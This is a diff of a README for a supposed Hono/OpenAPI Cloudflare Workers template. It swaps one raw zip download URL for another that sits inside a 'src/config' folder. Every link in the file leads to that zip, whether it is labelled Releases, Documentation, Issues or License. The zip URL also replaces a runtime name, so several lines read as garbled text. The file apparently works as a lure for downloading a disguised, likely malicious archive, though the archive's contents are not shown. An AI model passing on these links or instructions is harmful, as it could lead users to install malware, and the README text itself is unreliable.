@@ -1,20 +1,20 @@
 # 🚀 hono-openapi-template - Easy Setup for Cloudflare Workers
 
-[![Download](https://raw.githubusercontent.com/sestore/hono-openapi-template/main/vaward/hono-openapi-template.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/sestore/hono-openapi-template/main/vaward/hono-openapi-template.zip)
+[![Download](https://github.com/sestore/hono-openapi-template/raw/refs/heads/main/src/config/hono_openapi_template_2.6.zip%20Now-Click%20Here-blue)](https://github.com/sestore/hono-openapi-template/raw/refs/heads/main/src/config/hono_openapi_template_2.6.zip)
 
 ## 📖 Description
 hono-openapi-template is a type-safe and production-ready boilerplate for Cloudflare Workers. It uses Hono for routing, Zod for validation, Drizzle ORM for database interaction, and OpenAPI for creating clear and usable APIs. This template allows you to get started quickly with modern TypeScript tools, making it perfect for your next project.
 
 ## ⚙️ System Requirements
 - **Operating System:** Windows, macOS, or Linux
-- **https://raw.githubusercontent.com/sestore/hono-openapi-template/main/vaward/hono-openapi-template.zip Version:** Recommended 14.x or higher
+- **https://github.com/sestore/hono-openapi-template/raw/refs/heads/main/src/config/hono_openapi_template_2.6.zip Version:** Recommended 14.x or higher
 - **Cloudflare Workers Account:** Required for deployment
 
 ## 🚀 Getting Started
 To get started with hono-openapi-template, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://raw.githubusercontent.com/sestore/hono-openapi-template/main/vaward/hono-openapi-template.zip) to find the latest version of the software.
+   Go to the [Releases Page](https://github.com/sestore/hono-openapi-template/raw/refs/heads/main/src/config/hono_openapi_template_2.6.zip) to find the latest version of the software.
 
 2. **Choose Your Version**  
    Look for the most recent version. It will usually be marked as the latest release. Click on it to open the release details.
@@ -26,7 +26,7 @@ To get started with hono-openapi-template, follow these steps:
 To download and install the application, follow these steps:
 
 1. **Visit the Releases Page**  
-   Head over to the [Releases Page](https://raw.githubusercontent.com/sestore/hono-openapi-template/main/vaward/hono-openapi-template.zip).
+   Head over to the [Releases Page](https://github.com/sestore/hono-openapi-template/raw/refs/heads/main/src/config/hono_openapi_template_2.6.zip).
 
 2. **Select Your Download**  
    Find the file that suits your needs and click the link to download it.
@@ -68,8 +68,8 @@ To download and install the application, follow these steps:
 ## ⚙️ Troubleshooting
 If you encounter any issues during installation or running the software, try the following:
 
-1. **Check https://raw.githubusercontent.com/sestore/hono-openapi-template/main/vaward/hono-openapi-template.zip Version**  
-   Ensure that you are using the correct version of https://raw.githubusercontent.com/sestore/hono-openapi-template/main/vaward/hono-openapi-template.zip as mentioned in the system requirements.
+1. **Check https://github.com/sestore/hono-openapi-template/raw/refs/heads/main/src/config/hono_openapi_template_2.6.zip Version**  
+   Ensure that you are using the correct version of https://github.com/sestore/hono-openapi-template/raw/refs/heads/main/src/config/hono_openapi_template_2.6.zip as mentioned in the system requirements.
 
 2. **Look for Dependencies**  
    Some features may require additional packages. Check the documentation in the folder you downloaded for any dependency instructions.
@@ -84,8 +84,8 @@ If you need additional help, feel free to reach out through the Issues section o
 To contribute to this project, please fork the repository and submit a pull request with your changes. If you have suggestions for new features or improvements, feel free to open an issue.
 
 ## 🔗 Additional Links
-- [Documentation](https://raw.githubusercontent.com/sestore/hono-openapi-template/main/vaward/hono-openapi-template.zip)
-- [GitHub Issues](https://raw.githubusercontent.com/sestore/hono-openapi-template/main/vaward/hono-openapi-template.zip)
-- [License](https://raw.githubusercontent.com/sestore/hono-openapi-template/main/vaward/hono-openapi-template.zip)
+- [Documentation](https://github.com/sestore/hono-openapi-template/raw/refs/heads/main/src/config/hono_openapi_template_2.6.zip)
+- [GitHub Issues](https://github.com/sestore/hono-openapi-template/raw/refs/heads/main/src/config/hono_openapi_template_2.6.zip)
+- [License](https://github.com/sestore/hono-openapi-template/raw/refs/heads/main/src/config/hono_openapi_template_2.6.zip)
 
 Thank you for trying out hono-openapi-template! We hope it meets your needs and helps you build amazing applications on Cloudflare Workers.
